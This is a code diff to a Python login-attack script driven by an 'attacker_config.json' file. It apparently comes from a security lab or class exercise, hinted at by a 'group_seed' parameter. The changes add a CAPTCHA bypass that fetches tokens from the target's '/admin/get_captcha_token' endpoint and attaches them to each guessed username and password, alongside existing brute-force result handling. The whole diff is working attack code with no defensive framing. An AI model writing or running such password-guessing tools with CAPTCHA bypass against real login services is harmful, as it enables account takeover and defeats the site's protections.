@@ -3,10 +3,9 @@ import time
 import datetime
 import json
 import os
-import sys
 
 CONFIG_FILE = "attacker_config.json"
-
+CAPTCHA_TOKEN = None
 
 def load_config():
     if not os.path.exists(CONFIG_FILE):
@@ -67,18 +66,41 @@ def load_list_from_file(file_path, max_items=None):
         raise RuntimeError(f"Error loading file: {e}")
 
 
+def solve_captcha(config):
+    base_url = config["target_url"].replace("/login", "")
+    admin_url = f"{base_url}/admin/get_captcha_token"
+
+    try:
+        params = {"group_seed": config["group_seed"]}
+        response = requests.get(admin_url, params=params, timeout=5)
+
+        if response.status_code == 200:
+            token = response.json().get("captcha_token")
+            print(f"Solved CAPTCHA. Token: {token}")
+            return token
+        else:
+            print(f"[ERROR] Failed to get CAPTCHA token. Status: {response.status_code}")
+            return None
+    except Exception as e:
+        print(f"[ERROR] Exception while solving CAPTCHA: {e}")
+        return None
+
+
 def attempt_login(config, username, password, attack_type):
+    global CAPTCHA_TOKEN
     start_time = time.time()
     status_code = 0
     result = "ERROR"
+    payload = {"username": username, "password": password, "captcha_token": CAPTCHA_TOKEN} if CAPTCHA_TOKEN else {"username": username, "password": password}
 
     try:
         response = requests.post(
             config["target_url"],
-            json={"username": username, "password": password},
+            json=payload,
             timeout=config.get("request_timeout", 5)
         )
         status_code = response.status_code
+        print(f"{response.status_code} | msg: {response.text}")
         if status_code == 200:
             result = "SUCCESS"
         elif status_code == 401:
@@ -89,6 +111,13 @@ def attempt_login(config, username, password, attack_type):
             result = "RATE_LIMIT"
         else:
             result = f"UNKNOWN_{status_code}"
+        try:
+            resp_json = response.json()
+            if resp_json.get("captcha_required", False):
+                CAPTCHA_TOKEN = solve_captcha(config)
+                result = f"Solved CAPTCHA, CAPTCHA_TOKEN: {CAPTCHA_TOKEN}"
+        except ValueError:
+            pass
     except requests.exceptions.RequestException as e:
         print(f"Connection Error: {e}")
 
